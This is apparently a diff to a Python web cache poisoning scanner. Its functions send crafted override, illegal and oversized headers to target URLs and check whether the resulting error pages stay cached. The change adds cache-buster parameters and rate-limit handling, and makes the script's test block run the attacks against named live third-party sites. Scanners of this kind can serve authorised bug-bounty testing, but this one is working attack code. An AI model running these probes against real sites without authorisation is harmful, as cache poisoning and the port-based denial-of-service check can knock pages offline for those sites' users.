@@ -41,9 +41,9 @@ def print_banner():
 # random string generators
 #
 def gen_rand_str(length):
-    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
+    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
 def gen_rand_int(length):
-    return ''.join(random.choice(string.digits) for i in range(length))
+    return ''.join(random.choice(string.digits) for _ in range(length))
 
 #######################################
 ### RECON AND INFORMATION GATHERING ###
@@ -274,9 +274,9 @@ def attack_path_override(url, initial_response=None, timeout=20.0):
 
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                      "accept":"*/*, text/stuff",
-                                                      "origin":"https://www.example.com"})
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
     else:
         response = initial_response
 
@@ -293,7 +293,7 @@ def attack_path_override(url, initial_response=None, timeout=20.0):
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"/404" + gen_rand_str(16)})
         #if we get a non 200 response code, we remove the header and resend the request
-        if response.status_code != 200:
+        if response.status_code != 200 and response.status_code != 429:
             time.sleep(0.5)
 
             is_possible = True
@@ -305,7 +305,7 @@ def attack_path_override(url, initial_response=None, timeout=20.0):
             response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
-            if response.status_code != 200:
+            if response.status_code != 200 and response.status_code != 429:
                 is_vulnerable = True
     
     return (is_vulnerable, exploitable_headers, is_possible, is_probable)
@@ -320,9 +320,9 @@ def attack_protocol_override(url, initial_response=None, timeout=20.0):
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                      "accept":"*/*, text/stuff",
-                                                      "origin":"https://www.example.com"})
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
     else:
         response = initial_response
     
@@ -360,9 +360,9 @@ def attack_port_override(url, initial_response=None, timeout=20.0):
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                      "accept":"*/*, text/stuff",
-                                                      "origin":"https://www.example.com"})
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
     else:
         response = initial_response
 
@@ -379,12 +379,12 @@ def attack_port_override(url, initial_response=None, timeout=20.0):
                                                                                             "origin":"https://" + cache_buster + ".example.com",
                                                                                             header:"80"})
         #if we get a non 200 response code, we remove the header and resend the request
-        if response.status_code != 200:
+        if response.status_code != 200 and response.status_code != 429:
             time.sleep(0.5)
             response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
-            if response.status_code != 200:
+            if response.status_code != 200 and response.status_code != 429:
                 exploitable_headers.append(header)
                 is_vulnerable = True
     
@@ -399,9 +399,9 @@ def attack_method_override(url, initial_response=None, timeout=20.0):
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        initial_response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                      "accept":"*/*, text/stuff",
-                                                      "origin":"https://www.example.com"})
+        initial_response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
 
     if initial_response.status_code != 200:
         return (is_vulnerable, exploitable_headers)
@@ -476,9 +476,9 @@ def attack_evil_user_agent(url, initial_response=None, timeout=20.0):
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                      "accept":"*/*, text/stuff",
-                                                      "origin":"https://www.example.com"})
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
     else:
         response = initial_response
 
@@ -494,12 +494,12 @@ def attack_evil_user_agent(url, initial_response=None, timeout=20.0):
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
         #if we get a 403, repeat to see if cached
-        if response.status_code != 200:
+        if response.status_code != 200 and response.status_code != 429:
             time.sleep(0.5)
             response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                             "accept":"*/*, text/" + cache_buster,
                                                                                             "origin":"https://" + cache_buster + ".example.com"})
-            if response.status_code != 200:
+            if response.status_code != 200 and response.status_code != 429:
                 exploitable_values.append(value)
                 is_vulnerable = True
     
@@ -514,9 +514,9 @@ def attack_host_override(url, initial_response=None, timeout=20.0):
     
     #if the page does not return a 200 ok there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                      "accept":"*/*, text/stuff",
-                                                      "origin":"https://www.example.com"})
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
     else:
         response = initial_response
     
@@ -553,9 +553,9 @@ def attack_port_dos(url, initial_response=None, timeout=20.0):
     
     #if the response is not a redirect there's nothing to do
     if initial_response == None:
-        initial_response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                      "accept":"*/*, text/stuff",
-                                                      "origin":"https://www.example.com"})
+        initial_response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
 
     if initial_response.status_code not in [301, 302, 303, 307, 308]:
         return (is_vulnerable, exploitable_headers)
@@ -618,13 +618,13 @@ def attack_illegal_header(url, initial_response=None, timeout=20.0):
     
     #if the page does not return a 200 ok/redirect there's nothing to do
     if initial_response == None:
-        response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                      "accept":"*/*, text/stuff",
-                                                      "origin":"https://www.example.com"})
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
     else:
         response = initial_response
 
-    if response.status_code not in [200, 301, 302, 303, 307, 308]:
+    if response.status_code not in [200, 301, 302, 303, 307, 308, 429]:
         return (is_vulnerable, [])
 
 
@@ -635,12 +635,12 @@ def attack_illegal_header(url, initial_response=None, timeout=20.0):
                                                                                         "origin":"https://" + cache_buster + ".example.com",
                                                                                         "]":"x"})
     #if we get a non 200 response code, we remove the header and resend the request
-    if response.status_code not in [200, 301, 302, 303, 307, 308]:
+    if response.status_code not in [200, 301, 302, 303, 307, 308, 429]:
         time.sleep(0.5)
         response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                         "accept":"*/*, text/" + cache_buster,
                                                                                         "origin":"https://" + cache_buster + ".example.com"})
-        if response.status_code not in [200, 301, 302, 303, 307, 308]:
+        if response.status_code not in [200, 301, 302, 303, 307, 308, 429]:
             is_vulnerable = True
     
 
@@ -671,15 +671,17 @@ def specific_attacks(url, program_name, timeout=20.0):
     ret_val.url = url
     ret_val.program_name = program_name
 
+    cache_buster = "cache" + gen_rand_str(8)
+
     for i in range(4):
         try:
-            initial_response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                                  "accept":"*/*, text/stuff",
-                                                                  "origin":"https://www.example.com"})
+            initial_response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
             break
         except:
             if i == 3:
-                return
+                return ret_val
             else:
                 continue
 
@@ -721,9 +723,9 @@ def specific_attacks(url, program_name, timeout=20.0):
 
     for i in range(4):
         try:
-            initial_response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                                  "accept":"*/*, text/stuff",
-                                                                  "origin":"https://www.example.com"})
+            initial_response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
             break
         except:
             if i == 3:
@@ -776,9 +778,9 @@ def specific_attacks(url, program_name, timeout=20.0):
 
     for i in range(4):
         try:
-            initial_response = httpx.request("GET", url, timeout=timeout, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-                                                                  "accept":"*/*, text/stuff",
-                                                                  "origin":"https://www.example.com"})
+            initial_response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
             break
         except:
             if i == 3:
@@ -1063,5 +1065,7 @@ def assess_severity(url, program_name, headers, thread_count = 5):
 #print_banner()
 
 #test
-#specific_attacks("https://www.google.com/")
+bckp = setup_illegal_header_attack()
+specific_attacks("https://mick1990.tweakblogs.net", "Binary")
+cleanup_illegal_header_attack(bckp)
 #assess_severity("https://assets.finn.no/pkg/frontpage-podium/2.0.70/scripts.js", header_bruteforce("https://assets.finn.no/pkg/frontpage-podium/2.0.70/scripts.js"))
